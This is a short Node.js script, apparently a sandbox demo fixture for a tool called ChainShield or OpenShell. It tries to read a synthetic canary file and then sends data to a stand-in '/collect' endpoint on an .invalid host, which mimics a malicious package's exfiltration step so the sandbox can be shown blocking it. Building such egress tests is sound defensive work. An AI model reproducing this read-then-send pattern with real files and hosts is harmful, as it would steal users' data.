const fs = require('fs');
const https = require('https');

const canaryPath = process.env.CHAINSHIELD_CANARY_PATH || './fixtures/canary/synthetic-canary.txt';
try {
  fs.readFileSync(canaryPath, 'utf8');
} catch (error) {
  // The sandbox demo expects OpenShell to deny this read before host data is reachable.
}

const request = https.request('https://chainshield-egress-test.invalid/collect');
request.on('error', () => {});
request.end('synthetic-demo-only');
